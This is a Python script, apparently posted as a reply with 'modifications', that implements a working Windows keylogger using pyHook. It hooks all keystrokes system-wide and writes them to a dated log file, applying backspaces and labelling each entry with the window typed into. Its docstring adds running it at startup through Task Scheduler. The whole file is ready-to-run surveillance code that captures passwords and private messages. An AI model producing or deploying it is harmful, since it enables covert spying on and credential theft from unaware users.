"""
Awesome! Worked perfectly so I added some modifications.

-Task Scheduler (windows) to run on startup.
-datetime module to make a new log file each day.
-Removed sys and logging imports and instead used standard file code
-Stores each line rather than one character per line. (separates lines when enter/tab is pressed)
-Removes characters when backspace is pressed so final output is coherent.
-Displays (in the log), the window the text was typed into eg 'youtube', 'google', 'microsoft word'.
"""
import pyHook
import pythoncom
from datetime import datetime

import os
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

todays_date = datetime.now().strftime('%Y-%b-%d')
file_name =  todays_date + '.txt'
file_path = os.path.join(BASE_DIR,'logs', file_name)
line_buffer = ""  # current typed line before return character
window_name = ""  # current window


def SaveLineToFile(line):
    todays_file = open(file_path, 'a+')  # open todays file (append mode)
    todays_file.write(line)  # append line to file
    todays_file.close()  # close todays file


def OnKeyboardEvent(event):
    global line_buffer
    global window_name

    # print 'KeyID:', event.KeyID, chr(event.KeyID) #pressed value

    """if typing in new window"""
    if(window_name != event.WindowName):  # if typing in new window
        if(line_buffer != ""):  # if line buffer is not empty
            line_buffer += '\n'
            # print to file: any non printed characters from old window
            SaveLineToFile(line_buffer)

            line_buffer = ""  # clear the line buffer
            # print to file: the new window name
            SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n')
            window_name = event.WindowName  # set the new window name

    """if return or tab key pressed"""
    if(event.KeyID == 13 or event.KeyID == 9):  # return key
        line_buffer += '\n'
        SaveLineToFile(line_buffer)  # print to file: the line buffer
        line_buffer = ""  # clear the line buffer
        return True  # exit event

    """if backspace key pressed"""
    if(event.KeyID == 8):  # backspace key
        line_buffer = line_buffer[:-1]  # remove last character
        return True  # exit event

    """if non-normal KeyID character"""
    if(event.KeyID < 32 or event.KeyID > 126):
        if(event.KeyID == 0):  # unknown character (eg arrow key, shift, ctrl, alt)
            pass  # do nothing
        else:
            line_buffer = line_buffer + '\n' + str(event.Key) + '\n'
    else:
        line_buffer += event.Key  # add pressed character to line buffer

    return True  # pass event to other handlers


hooks_manager = pyHook.HookManager()  # create hook manager
hooks_manager.KeyDown = OnKeyboardEvent  # watch for key press
hooks_manager.HookKeyboard()  # set the hook
pythoncom.PumpMessages()  # wait for events﻿
